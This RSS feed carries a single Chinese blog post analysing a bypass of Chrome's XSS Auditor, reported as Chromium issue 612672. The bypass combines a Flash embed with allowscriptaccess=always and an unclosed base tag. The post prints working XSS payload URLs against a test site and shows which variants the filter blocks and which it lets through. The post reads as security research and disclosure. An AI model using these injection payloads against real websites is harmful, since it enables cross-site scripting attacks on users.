<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Chrome on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/chrome/</link>
        <description>Recent content in Chrome on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright><atom:link href="http://localhost:1313/tags/chrome/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>利用Flash和base标签绕过XSS Auditor的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;img src="https://example.com/xss-bypass.jpg" alt="Featured image of post 利用Flash和base标签绕过XSS Auditor的技术分析" /&gt;&lt;h1 id=&#34;利用flash和base标签绕过xss-auditor&#34;&gt;利用Flash和base标签绕过XSS Auditor
&lt;/h1&gt;&lt;p&gt;几天前，我正在和Mario一起研究如何绕过Chrome的XSS Auditor。Mario发现了这个绕过方法：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://t.co/c9UcjpDZZM&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;XSS Auditor Bypasses 05.2016&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我也发现了另一个绕过方法。在这篇文章中，我想分享我的攻击向量。&lt;/p&gt;
&lt;p&gt;我已经在Chromium项目中提交了这个bug：&lt;a class=&#34;link&#34; href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=612672&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Chromium Issue #612672&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;攻击向量&#34;&gt;攻击向量
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+allowscriptaccess=always+src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base+href=//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;embed allowscriptaccess=always src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base href=//l0.cm/&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;让我们来看看这个绕过方法的实现过程。&lt;/p&gt;
&lt;h2 id=&#34;分析过程&#34;&gt;分析过程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;直接使用&lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;标签加载外部资源会被拦截：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+src=https://evil/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed src=https://evil/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;但是加载同源且没有查询字符串的资源不会被拦截：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+src=http://localhost:1313/aaa&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed src=http://localhost:1313/aaa&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;如果我们能改变基础URL，就有可能实现XSS攻击。base标签通常也会被拦截，但如果它没有用&lt;code&gt;&amp;gt;&lt;/code&gt;闭合，在某些情况下Auditor不会拦截。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以下情况会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=3&amp;amp;q=&amp;lt;base+href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;base href=//evil/ &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;但以下情况不会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;base+href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;base href=//evil/&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;区别在于前者在注入点后有一个空格。看起来如果页面在注入点后直接有空格，Auditor会拦截。换句话说，如果页面在注入点后没有直接的空格，我们就可以注入base标签而不被拦截。&lt;/p&gt;
&lt;p&gt;因此，我的攻击向量有效！&lt;/p&gt;
&lt;h2 id=&#34;其他绕过方法&#34;&gt;其他绕过方法
&lt;/h2&gt;&lt;p&gt;如果注入点后有空格，我们还有机会绕过。如果注入点下方存在&lt;code&gt;&amp;quot;&lt;/code&gt;字符，我们可以使用未闭合的属性引号来绕过Auditor，如&lt;code&gt;&amp;lt;base href=&amp;quot;//evil/&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;以下情况不会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=4&amp;amp;q=&amp;lt;embed+allowscriptaccess=always+src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base+href=&amp;#34;//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed allowscriptaccess=always src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base href=&amp;#34;//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/div&amp;gt;&amp;lt;div id=&amp;#34;x&amp;#34;&amp;gt;AAA&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个绕过方法很有用，因为大多数页面在注入点下方都有&lt;code&gt;&amp;quot;&lt;/code&gt;字符。&lt;/p&gt;
&lt;p&gt;另外，&lt;code&gt;&amp;lt;script src=http://localhost:1313/xss.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;base href=//evil/&lt;/code&gt;也不会被拦截。但我们无法加载外部资源，因为在设置base URL之前就开始加载了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=%3Cscript%20src=http://localhost:1313/xss.js%3E%3C/script%3E%3Cbase%20href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因此，我使用了Flash来实现攻击。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;这就是全部内容。感谢阅读我的文章！&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
